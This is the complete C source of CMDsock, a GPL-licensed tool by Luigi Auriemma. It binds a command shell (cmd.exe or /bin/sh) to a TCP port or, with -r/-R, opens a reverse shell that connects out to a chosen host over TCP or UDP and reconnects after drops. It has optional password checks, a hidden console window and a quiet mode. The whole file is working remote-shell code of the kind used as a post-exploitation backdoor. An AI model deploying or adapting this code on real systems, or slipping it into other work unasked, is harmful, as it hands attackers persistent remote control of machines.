/*
    Copyright 2005,2006 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close       closesocket
    #define sleep       Sleep
    #define ONESEC      1000
    #define WAITDELAY   sleep(30);
    #define ASYNC       int async = 1; \
                        if(ioctlsocket(sd, FIONBIO, (void *)&async) < 0) std_err();
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <pthread.h>
    #include <sys/types.h>
    #include <fcntl.h>
    #include <sys/wait.h>

    #define ONESEC      1
    #define WAITDELAY   usleep(30000);
    #define HANDLE      int
    #define DWORD       u_int

    #ifndef WNOHANG
        #define WNOHANG 1
        #define SIGTERM 15
        #define SIGKILL 9
    #endif
    #define CloseHandle     close
    #define STILL_ACTIVE    0x103
    #define ASYNC       int async; \
                        if((async = fcntl (sd, F_GETFL)) < 0 || \
                          fcntl(sd, F_SETFL, async | O_NONBLOCK) < 0) std_err();

    int ReadFile(HANDLE hFile, u_char *lpBuffer, DWORD nNumberOfBytesToRead, DWORD *lpNumberOfBytesRead, void *lpOverlapped) {
        int     len;

        if(lpNumberOfBytesRead) *lpNumberOfBytesRead = 0;
        len = read(hFile, lpBuffer, nNumberOfBytesToRead);
        if(len < 0) return(0);
        if(lpNumberOfBytesRead) *lpNumberOfBytesRead = len;
        return(len);
    }

    int WriteFile(HANDLE hFile, u_char *lpBuffer, DWORD nNumberOfBytesToWrite, DWORD *lpNumberOfBytesWritten, void *lpOverlapped) {
        int     len;

        if(lpNumberOfBytesWritten) *lpNumberOfBytesWritten = 0;
        len = write(hFile, lpBuffer, nNumberOfBytesToWrite);
        if(len < 0) return(0);
        if(lpNumberOfBytesWritten) *lpNumberOfBytesWritten = len;
        return(len);
    }

    int GetExitCodeProcess(HANDLE hProcess, DWORD *lpExitCode) {
        int     status;

        if(waitpid(hProcess, &status, WNOHANG) < 0) {
            *lpExitCode = !STILL_ACTIVE;
        } else {
            *lpExitCode = STILL_ACTIVE;
        }
        return(1);
    }
#endif

#ifdef WIN32
    #define quick_thread(NAME, ARG) DWORD WINAPI NAME(ARG)
    #define thread_id   DWORD
#else
    #define quick_thread(NAME, ARG) void *NAME(ARG)
    #define thread_id   pthread_t
#endif

thread_id quick_threadx(void *func, void *data) {
    thread_id       tid;
#ifdef WIN32
    if(!CreateThread(NULL, 0, func, data, 0, &tid)) return(0);
#else
    pthread_attr_t  attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if(pthread_create(&tid, &attr, func, data)) return(0);
#endif
    return(tid);
}



#define VER             "0.1.2a"
#define BUFFSZ          2048
#define MAXPWD          32
#define PORT            23
#define DELAY           1           // seconds before forced termination
#define REVDELAY        5           // seconds to wait for reverse shell reconnection
#define TRYTOQUIT       "\x03"      /* CTRL-C */    \
                        "\x04"      /* CTRL-D */    \
                        "\x15"      /* CTRL-U */    \
                        "\x1a"      /* CTRL-Z */    \
                        "\r\n"                      \
                        "exit\r\n"                  \
                        "\r\n"                      \
                        "exit\n"                    \
                        "\n"
#define ENDSOCK(A)      {                           \
                            shutdown(A, 2);         \
                            close(A);               \
                            printf("  closed\n");   \
                        }
#define CHKPWD(A,B)     if(password && (auth(A, password) < 0)) {   \
                            ENDSOCK(A)                              \
                            B;                                      \
                        }
#define WFILE(A,B,C,D)  if(!WriteFile(A, B, C, &len, NULL) || (len != C)) { \
                            D;                                              \
                        }
#define DUPHAND(A,B,C)  if(!DuplicateHandle(            \
                            GetCurrentProcess(),        \
                            A,                          \
                            GetCurrentProcess(),        \
                            &B,                         \
                            0,                          \
                            C,                          \
                            DUPLICATE_SAME_ACCESS)) {   \
                            winerr();                   \
                        }
#define INPUT_CRLF      1
#define INPUT_CR        2
#define INPUT_LF        4
#define OUTPUT_CRLF     8
#define OUTPUT_CR       16
#define OUTPUT_LF       32



char    *cmd;
int     detach     = 0,
        crlf       = 0,
        dump       = 0,
        telnet_opt = 0;
typedef struct {
    int     sock;
    HANDLE  input;
    HANDLE  output;
    HANDLE  error;
    HANDLE  proc;
} argz;



void show_help(u_char *exename);
u_char *get_cmd_name(void);
int auth(int sd, u_char *password);
quick_thread(cmdbind, int sd);
void KillProcess(DWORD id);
DWORD do_crlf(u_char *data, DWORD len);
int special_chars(u_char *data, int len);
int check_telnet(int sd, u_char *data, int len);
uint32_t resolv(char *host);
void winerr(void);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            sdl,
            sda       = 0,
            psz,
            on        = 1,
            i,
            reverse   = 0,
            udp       = 0;
    u_short port      = PORT;
    u_char  *password = NULL,
            *iface    = "0.0.0.0",
            *p,
            *exe      = NULL;

#ifdef WIN32
    WSADATA wsadata;
    if(WSAStartup(MAKEWORD(1,0), &wsadata)) std_err();
#endif

    setbuf(stdin,  NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    fputs("\n"
        "CMDsock "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        show_help(argv[0]);
    }

    for(i = 1; i < argc; i ++) {
        switch(argv[i][1]) {
            case '-':
            case '?':
            case 'h': {
                show_help(argv[0]);
                printf("If no options are specified, will be used the default configuration\n");
                return(0);
                } break;
            case 'w': password   = argv[++i];       break;
            case 'p': port       = atoi(argv[++i]); break;
            case 'l': crlf       = 1;               break;
            case 'i': iface      = argv[++i];       break;
            case 'R': reverse++;                    // = 2
            case 'r': {
                reverse++;                          // = 1
                iface = argv[++i];
                p = strchr(iface, ':');
                if(p) {
                    *p = 0;
                    port = atoi(p + 1);
                }
                } break;
            case 'u': udp        = 1;               break;
            case 'q': {
                fclose(stdout);
                fclose(stderr);
                } break;
            case 'e': exe        = argv[++i];       break;
            case 'd': dump       = atoi(argv[++i]); break;
            case 't': telnet_opt = 1;               break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                } break;
        }
    }

    peer.sin_addr.s_addr = resolv(iface);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    cmd = get_cmd_name();
    if(exe) cmd = exe;
    printf("- shell executable: %s\n", cmd);

    if(reverse) {
        for(;;) {
            printf("  connect to %s:%hu\n",
                inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

            if(udp) {
                sd = socket(AF_INET, SOCK_DGRAM,  IPPROTO_UDP);
            } else {
                sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            }

            if(sd < 0) std_err();
            if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
              < 0) std_err();

            CHKPWD(sd, goto reverse_again)

            cmdbind(sd);

            reverse_again:
            if(reverse == 1) break;
            printf("  reconnect in %d seconds\n", REVDELAY);
            sleep(REVDELAY * ONESEC);
        }
        return(0);
    }

    printf("- bind port %hu\n", port);
    sdl = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sdl < 0) std_err();
    if(setsockopt(sdl, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
      < 0) std_err();
    if(bind(sdl, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
      < 0) std_err();
    if(listen(sdl, SOMAXCONN)
      < 0) std_err();

    printf("- clients:\n");
    for(;;) {
        psz = sizeof(struct sockaddr_in);
        sda = accept(sdl, (struct sockaddr *)&peer, &psz);
        if(sda < 0) std_err();

        printf("  %s:%hu\n",
            inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

        CHKPWD(sda, continue)

        if(!quick_threadx(cmdbind, (void *)sda)) close(sda);
    }

    close(sdl);
    return(0);
}



void show_help(u_char *exename) {
    printf("\n"
        "Usage: %s [options]\n"
        "\n"
        "Options:\n"
        "-w PASS   set a password requested for the access (max %d chars)\n"
        "-p PORT   change the port to bind (%hu)\n"
        "-l        force each input line-feed in CR/LF (auto on Win9x, default is lf)\n"
        "-i IP     local interface/IP on which listening (default ANY)\n"
        "-r H[:P]  reverse shell, connects to a specific host (H) and port (P, %hu)\n"
        "-R H[:P]  as above but if the connection is lost it reconnects in %d seconds\n"
        "-u        use UDP instead of TCP (works only with the above reverse shell)\n"
        "-q        quiet output\n"
        "-e EXE    execute EXE (a command-line) instead of cmd.exe/command.com\n"
        "-d LEVEL  dump of the data to the screen: LEVEL equal to 1 for incoming data\n"
        "          only, 2 for output data only or 3 for both\n"
        "-t        telnet option which forces the client to send chars immediately\n"
        "          this option is EXPERIMENTAL and will be implemented in futuer\n"
        "\n"
        "Note that at the moment is not possible to stop the programs called from this\n"
        "shell (for example like an endless ping) and on Windows is not possible to\n"
        "use stdin (for example if you launch a program which asks for a password)\n"
        "\n",
        exename, MAXPWD, PORT, PORT, REVDELAY);
}



u_char *get_cmd_name(void) {
    u_char          *cmd;
#ifdef WIN32
    OSVERSIONINFOA  verinfo;

    verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionEx(&verinfo);
    if(verinfo.dwPlatformId >= VER_PLATFORM_WIN32_NT) {
        cmd    = "cmd.exe";
    } else {
        cmd    = "command.com";
        detach = DETACHED_PROCESS;
        if(crlf) {
            crlf = 0;
            printf("- CR/LF conversion automatically disabled\n");
        } else {
            crlf = 1;
            printf("- CR/LF conversion automatically enabled\n");
        }
    }
#else
    cmd = "/bin/sh";
#endif
    return(cmd);
}



int auth(int sd, u_char *password) {
    int     len;
    u_char  buff[MAXPWD + 1 + 3],
            *p,
            *l;

    #define ASKMSG  "\nPassword: "
    send(sd, ASKMSG, sizeof(ASKMSG) - 1, 0);
    #undef ASKMSG

    l = buff + MAXPWD;
    for(p = buff; p < l; p += len) {
        if(recv(sd, p, 1, 0) <= 0) return(-1);
        if(*p <= '\r') break;
        len = check_telnet(sd, p, 1);
        if(len < 0) return(-1);
    }
    *p = 0;

    if(strcmp(buff, password)) {
        #define ASKMSG  "\nWrong password\n"
        send(sd, ASKMSG, sizeof(ASKMSG) - 1, 0);
        #undef ASKMSG
        return(-1);
    }
    return(0);
}



quick_thread(cmdbind, int sd) {
    HANDLE  process_pid,
            in_write = 0,
            out_read = 0,
            err_read = 0;
    DWORD   dwProcessId,
            pstat,
            len      = 0;
    u_char  buff[(BUFFSZ << 1) + 1 + 3];
            // double BUFFSZ for handling crlf correctly (for example \n -> \r\n)
            // +3 is for possible telnet options

#ifdef WIN32
    SECURITY_ATTRIBUTES sec;
    STARTUPINFO         startup_info;
    PROCESS_INFORMATION process_info;
    HANDLE  out_read_tmp = 0,
            out_write    = 0,
            err_write    = 0,
            in_read      = 0,
            in_write_tmp = 0;

    sec.nLength              = sizeof(SECURITY_ATTRIBUTES);
    sec.lpSecurityDescriptor = NULL;
    sec.bInheritHandle       = TRUE;

    if(!CreatePipe(&out_read_tmp, &out_write,    &sec, BUFFSZ)) winerr();
    if(!CreatePipe(&in_read,      &in_write_tmp, &sec, BUFFSZ)) winerr();

    DUPHAND(out_write,    err_write, TRUE)
    DUPHAND(out_read_tmp, out_read,  FALSE)
    DUPHAND(in_write_tmp, in_write,  FALSE)

    if(!CloseHandle(in_write_tmp)) winerr();
    if(!CloseHandle(out_read_tmp)) winerr();

    GetStartupInfo(&startup_info);
    startup_info.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    startup_info.wShowWindow = SW_HIDE;
    startup_info.hStdInput   = in_read;
    startup_info.hStdOutput  = out_write;
    startup_info.hStdError   = err_write;

    if(!CreateProcess(
        NULL,                   // lpApplicationName
        cmd,                    // lpCommandLine
        NULL,                   // lpProcessAttributes
        NULL,                   // lpThreadAttributes
        TRUE,                   // bInheritHandles
        CREATE_NEW_CONSOLE,     // dwCreationFlags, detach | CREATE_NEW_PROCESS_GROUP
        NULL,                   // lpEnvironment
        NULL,                   // lpCurrentDirectory
        &startup_info,          // lpStartupInfo
        &process_info)) {       // lpProcessInformation
            winerr();
    }

    if(!CloseHandle(in_read))   winerr();
    if(!CloseHandle(out_write)) winerr();
    if(!CloseHandle(err_write)) winerr();

    process_pid = process_info.hProcess;
    dwProcessId = process_info.dwProcessId;
    err_read    = out_read;

#else

    int     stdin_pipe[2],
            stdout_pipe[2],
            stderr_pipe[2];

    if(pipe(stdin_pipe) || pipe(stdout_pipe) || pipe(stderr_pipe)) {
        std_err();
    }

    process_pid = fork();
    if(process_pid < 0) {
        std_err();

    } else if(!process_pid) {
        close(STDIN_FILENO);
        dup(stdin_pipe[0]);
        close(stdin_pipe[0]);
        close(stdin_pipe[1]);

        close(STDOUT_FILENO);
        dup(stdout_pipe[1]);
        close(stdout_pipe[0]);
        close(stdout_pipe[1]);

        close(STDERR_FILENO);
        dup(stderr_pipe[1]);
        close(stderr_pipe[0]);
        close(stderr_pipe[1]);

            /* I use system if the user has chosen command and arguments (like ping localhost) */
            /* or execlp for any other single command like /bin/sh                             */
        if(strchr(cmd, ' ')) {
            if(system(cmd) < 0) kill(getppid(), SIGTERM);               // std_err()
        } else {
            if(execlp(cmd, cmd, NULL) < 0) kill(getppid(), SIGTERM);    // std_err()
        }
        waitpid(0, NULL, WNOHANG);
        kill(0, SIGTERM);
        exit(EXIT_FAILURE);
    }

    close(stdin_pipe[0]);
    close(stdout_pipe[1]);
    close(stderr_pipe[1]);

    if(fcntl(stdin_pipe[1],  F_SETFL, fcntl(stdin_pipe[1],  F_GETFL) | O_NONBLOCK) < 0) std_err();
    if(fcntl(stdout_pipe[0], F_SETFL, fcntl(stdout_pipe[0], F_GETFL) | O_NONBLOCK) < 0) std_err();
    if(fcntl(stderr_pipe[0], F_SETFL, fcntl(stderr_pipe[0], F_GETFL) | O_NONBLOCK) < 0) std_err();

    in_write    = stdin_pipe[1];
    out_read    = stdout_pipe[0];
    err_read    = stderr_pipe[0];
    dwProcessId = process_pid;
#endif

    if(telnet_opt) {
        send(sd,
                            // "\xff\xfb\x01"  // will echo
            "\xff\xfd\x03"  // do suppress go ahead
            "\xff\xfb\x03", // will suppress go ahead
            6, 0);
    }

    ASYNC

    while(GetExitCodeProcess(process_pid, &pstat) && (pstat == STILL_ACTIVE)) {
#ifdef WIN32
        if(PeekNamedPipe(out_read, NULL, 0, NULL, (DWORD *)&len, 0) && len) {
#endif
            if(ReadFile(out_read, buff, BUFFSZ, &len, NULL) && len) {   // STDOUT
                if(dump & 2) fwrite(buff, len, 1, stdout);
                if(send(sd, buff, len, 0)
                  < 0) break;
            }
#ifdef WIN32
        }
#else
        if(ReadFile(err_read, buff, BUFFSZ, &len, NULL) && len) {       // STDERR
            if(dump & 2) fwrite(buff, len, 1, stderr);
            if(send(sd, buff, len, 0)
              < 0) break;
        }
#endif
        len = recv(sd, buff, BUFFSZ, 0);                                // STDIN
        if(!len) {
            sd = 0;
            break;
        }
        if((int)len > 0) {
            len = check_telnet(sd, buff, len);
            if((int)len < 0) break;

            if(telnet_opt) len = special_chars(buff, len);

            if(dump & 1) fwrite(buff, len, 1, stdout);

            len = do_crlf(buff, len);
            WFILE(in_write, buff, len, break)
        }

        WAITDELAY;
    }

        // I want to be sure that the process will be killed
        // but on Windows 9x it's not simple, command.com freezes if forced
    if(!sd) {
        WFILE(in_write, TRYTOQUIT, sizeof(TRYTOQUIT) - 1, )
        sleep(DELAY * ONESEC);
    }

    KillProcess(dwProcessId);

    CloseHandle(in_write);
    CloseHandle(out_read);
    if(err_read != out_read) CloseHandle(err_read);

    ENDSOCK(sd)
    return(0);
}



void KillProcess(DWORD id) {
#ifdef WIN32
    HANDLE  hp;

    hp = OpenProcess(PROCESS_TERMINATE, FALSE, id);
    if(!hp) return;
    TerminateProcess(hp, -1);
    CloseHandle(hp);
#else
    waitpid(id, NULL, WNOHANG);
    kill(id, SIGTERM);
#endif
}



DWORD do_crlf(u_char *data, DWORD len) {
    u_char  *p,
            *limit;

    data[len] = 0;  // needed for a faster \r\n handling

    p     = data;
    limit = data + len;
    while(p < limit) {
        if((p[0] == '\r') && (p[1] == '\n')) {
            if(crlf) {                  // it's already a \r\n
                p += 2;
            } else {                    // remove \r to have only \n
                limit--;
                memmove(p, p + 1, limit - p);
                p++;
            }

        } else if(*p == '\r') {         // remove \r
            limit--;
            memmove(p, p + 1, limit - p);

        } else if(*p == '\n') {
            if(crlf) {                  // add \r for \r\n
                memmove(p + 1, p, limit - p);
                *p = '\r';
                p += 2;
                limit++;
            } else {                    // it's already \n
                p++;
            }

        } else {
            p++;
        }
        // do not add instructions here!
    }

    return(p - data);
}



int special_chars(u_char *data, int len) {
#define DOIT(A,B,C,D)                           \
        if((len == B) && !memcmp(data, A, B)) { \
            memcpy(data, C, D);                 \
            return(D);                          \
        } else

    DOIT("\x1b\x5b\x43",     3, "\xe0\x4d", 2)  // RIGHT
    DOIT("\x1b\x5b\x44",     3, "\xe0\x4b", 2)  // LEFT
    DOIT("\x1b\x5b\x41",     3, "\xe0\x48", 2)  // UP
    DOIT("\x1b\x5b\x42",     3, "\xe0\x50", 2)  // DOWN
    DOIT("\x1b\x5b\x35\x7e", 4, "\xe0\x49", 2)  // PGUP
    DOIT("\x1b\x5b\x36\x7e", 4, "\xe0\x51", 2)  // PGDOWN
    DOIT("\x1b\x5b\x32\x7e", 4, "\xe0\x52", 2)  // INS
    DOIT("\x1b\x4f\x48",     3, "\xe0\x47", 2)  // <-
    DOIT("\x1b\x5b\x33\x7e", 4, "\xe0\x53", 2)  // CANC
    DOIT("\x1b\x4f\x46",     3, "\xe0\x4f", 2)  // END
    DOIT("\x1b\x5b\x31\x7e", 4, "\x00\x47", 2)  // *7
    DOIT("\x1b\x5b\x35\x7e", 4, "\x00\x49", 2)  // *9
    DOIT("\x1b\x5b\x45",     3, "\x00\x4c", 2)  // *5
    DOIT("\x1b\x5b\x34\x7e", 4, "\x00\x4f", 2)  // *1
    DOIT("\x1b\x5b\x36\x7e", 4, "\x00\x51", 2)  // *3
                                                // *8,4,6,2 differs on Win
    { }
    return(len);
#undef DOIT
}



int check_telnet(int sd, u_char *data, int len) {
#define TN_IAC      255
#define TN_DONT     254
#define TN_DO       253
#define TN_WONT     252
#define TN_WILL     251
#define TN_SB       250
#define TN_GA       249
#define TN_EL       248     // CTRL-C, CTRL-U, CTRL-Z
#define TN_EC       247
#define TN_AYT      246
#define TN_AO       245
#define TN_IP       244
#define TN_BRK      243
#define TN_DM       242
#define TN_NOP      241
#define TN_SE       240
#define TN_EOR      239
#define TN_ABORT    238
#define TN_SUSP     237
#define TN_EOF      236     // CTRL-D
#define CHGOPT(X,Y) if(opt == X) {          \
                        data[i - 1] = Y;    \
                        skip--;             \
                        i--;                \
                    }

    int     i,
            opt,
            skip;

    for(;;) {
        for(i = 0; i < len; i++) {
            if(data[i] == TN_IAC) break;
        }
        if(i == len) break;

            // skip TN_IAC
        i++;

            // read option
        if(i == len) {
            if(recv(sd, data + i, 1, 0) <= 0) return(-1);
            len++;
        }

        opt = data[i];
        switch(opt) {   // handle option
            case TN_EOF:
            case TN_SUSP:
            case TN_ABORT:
            case TN_EOR:
            case TN_SE:
            case TN_NOP:
            case TN_DM:
            case TN_BRK:
            case TN_IP:
            case TN_AO:
            case TN_AYT:
            case TN_EC:
            case TN_EL:
            case TN_GA:
            case TN_SB:     skip = 0;   break;  // is TN_SB correct?
            case TN_WILL:
            case TN_WONT:
            case TN_DO:
            case TN_DONT:   skip = 1;   break;
            default:        skip = 0;   break;
        }

            // skip option
        i++;

            // read & skip option's data
        if(skip) {
            if(i == len) {
                if(recv(sd, data + i, 1, 0) <= 0) return(-1);
                len++;
            }
            i++;
        }

        CHGOPT(TN_EOF, 0x04)
        else CHGOPT(TN_EL, 0x03)
        else CHGOPT(TN_IP, 0x03)
        else CHGOPT(TN_EC, 0x08)
        else CHGOPT(TN_EL, 0x03)
        else if(opt == TN_DO) {
            // when you press CTRL-C in telnet it sends the byte 06
            // I convert it in 03 which means local CTRL-C
            if(data[i - 1] == 0x06) {
                data[i - 1] = 0x03;
                skip--;
                i--;
            }
        }

        memmove(
            data + i - (1 + 1 + skip),
            data + i,
            len  - i);

        len -= 1 + 1 + skip;
        //     \IAC\opt\data
    }
    return(len);
}



uint32_t resolv(char *host) {
    struct      hostent *hp;
    uint32_t    host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(uint32_t *)hp->h_addr;
    }
    return(host_ip);
}



void winerr(void) {
#ifdef WIN32
    char    message[512];

    if(FormatMessage(
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL,
      GetLastError(),
      0,
      (char *)&message,
      sizeof(message),
      NULL)) {
        printf("\nError: %s\n", message);
    } else {
        printf("\nError: %s\n", strerror(errno));
    }
#else
    perror("\nError");
#endif
    exit(1);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

